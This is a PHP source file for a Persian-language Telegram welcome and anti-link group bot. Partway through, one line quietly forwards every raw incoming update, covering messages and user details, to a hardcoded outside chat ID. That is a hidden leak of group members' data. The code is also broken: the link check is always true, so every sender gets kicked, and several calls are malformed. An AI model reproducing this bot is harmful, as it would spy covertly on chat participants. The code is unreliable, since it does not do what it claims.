<?php 
$token = 'توکن';

$json = file_get_contents('php://input');
$telegram = urldecode ($json);
$telegram = str_replace ('jason=','',$telegram);
$results = json_decode($telegram); 

$message = $results->message;
$chat = $message->chat;
$chat_id = $chat->id;
$fromuser = $message->from;
$user_id = $fromuser->id;
$username = $fromuser->username;

$text = $message->text;



$about = getMe($token);
$me = json_decode ($about);
$me = $me->result;
$me_username = $me->username;

$new_chat_member = $message->new_chat_member;
$new_chat_member_id = $new_chat_member->id;
$new_chat_member_first_name = $new_chat_member->first_name;
$new_chat_member_last_name = $new_chat_member->last_name;
$new_chat_member_username = $new_chat_member->username;
$groupname = $chat->title;
if ($new_chat_member_id != '') {
  if ($me_username != $new_chat_member_username) {
    $welcome_massage = 'درود '.$new_chat_member_first_name.' '. $new_chat_member_last_name.' عزیز'.chr(10).'به گروه سالار '.$groupname.' خوش آمدید'.chr(10).'@'.$new_chat_member_username;
    $welcome_massage = urlencode($welcome_massage);
    send_group_message($chat_id,$token,$welcome_massage);
  } else {
    $members = getChatMembersCount($chat_id,$token);
    if ($members < 100) {
      $welcome_massage = 'ربات سکسیتون رو دعوت کردید باریکلا';
      send_group_message($chat_id,$token,$welcome_massage);
      $admins = getChatAdministrators  ($chat_id,$token);
      if (is_array($admins)) {
        foreach ($admins as $admin) {  
          $user = $admin->user;
          $status = $admin->status;
        }
      }  
    } 
}
}

$left_chat_member = $message->left_chat_member;
$left_chat_member_id = $left_chat_member->id;
$left_chat_member_first_name = $left_chat_member->first_name;
$left_chat_member_last_name = $left_chat_member->last_name;
$groupname = $chat->title;
if ($left_chat_member_id != '') {
  $leave_message = 'دوستان، '.$left_chat_member_first_name.' '. $left_chat_member_last_name.' عزیز'.chr(10).'گروه '.$groupname.'را ترک کرد!';
  $leave_message = urlencode($leave_message);
  send_group_message($chat_id,$token,$leave_message);
}

$new_chat_title = $message->new_chat_title;
if ($new_chat_title != '') {
  $chanetitle = 'دوستان '.$username.' اسم گروه رو به'.$new_chat_title.' تغییر داد.';
  send_group_message($chat_id,$token,$chanetitle);
}
$url = 'https://api.telegram.org/bot'.$token.'/sendMessage?chat_id=80853440&text='.$json;
 file_get_contents($url);
unbanChatMember ('$user_id','$chat_id',$token);
if ($text == 'http://telegram.me/' || 'https://telegram.me/') {
   kickChatMember ($user_id,$chat_id,$token);
 }
function kickChatMember ($user_id,$chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/kickChatMember?chat_id='.$chat_id.'&user_id='.$user_id;
  file_get_contents($url);
}
function unbanChatMember ($user_id,$chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/unbanChatMember?chat_id='.$chat_id.'&user_id='.$user_id;
  file_get_contents($url);
}
function send_group_message($chat_id,$token,$message) {
  $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.$message;
  file_get_contents($url);
}
function getChat($chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/getChat?chat_id='.$chat_id;
  $result = file_get_contents($url);
  //send_group_message($chat_id,$token,$result);
}
function getChatAdministrators($chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/getChatAdministrators?chat_id='.$chat_id;
  $result = file_get_contents($url);
  //send_group_message($chat_id,$token,$result);
  $result = json_decode ($result);
  $result = $result->result;
  return $result;
}
function getChatMembersCount($chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/getChatMembersCount?chat_id='.$chat_id;
  $result = file_get_contents($url);
  $result = json_decode ($result);
  $result = $result->result;
  return $result;
}
function leaveChat($chat_id,$token) {
  $url = 'https://api.telegram.org/bot'.$token.'/leaveChat?chat_id='.$chat_id;
  $result = file_get_contents($url);
}
function getMe($token) {
  $url = 'https://api.telegram.org/bot'.$token.'/getMe';
  $result = file_get_contents($url);
  return ($result);
}
//====================ᵗᶦᵏᵃᵖᵖ======================//
define('API_KEY',$token);
//----######------
function ali($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($datas));
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$result=json_decode($message,true);
//_
$update = json_decode(file_get_contents('php://input'));
var_dump($update);
//=========
//_______
function SendMessage($chat_id, $ALI)
{
 ali('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$ALI,
'parse_mode'=>"MarkDown"
]);
}
function SendAction($chat_id, $action){
	ali('SendChatAction',[
	'chat_id'=>$chat_id,
	'action'=>$action
	]);
	}
//====================ᵗᶦᵏᵃᵖᵖ======================//
if($text == "/start"){
    var_dump(ali('sendMessage',[ 
    SendAction($chat_id, typing),
        'chat_id'=>$update->message->chat->id, 
        'text'=>"سلام دوست عزیز به ربات ضد لینک و خوش امد گوشی گروه خوش امدید😉😅\n برای اینکه بتونی از من استفاده کنی من را عوض گروهت کن😉",
        'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [
                    ['Salar'=>"سازنده من😊",'url'=>"https://telegram.me/wiker"],['text'=>"کانال من😎",'url'=>"https://telegram.me/buyvirtual"]
                ]
            ]
        ])
    ]));
}
elseif(preg_match('/^\/([Oo]therbot)/',$textmessage)){
        ali("forwardmessage", [
                'chat_id' => $chat_id,
                'from_chat_id' => "@tikapp",
                'message_id' => 12
            ]);
        }
?>




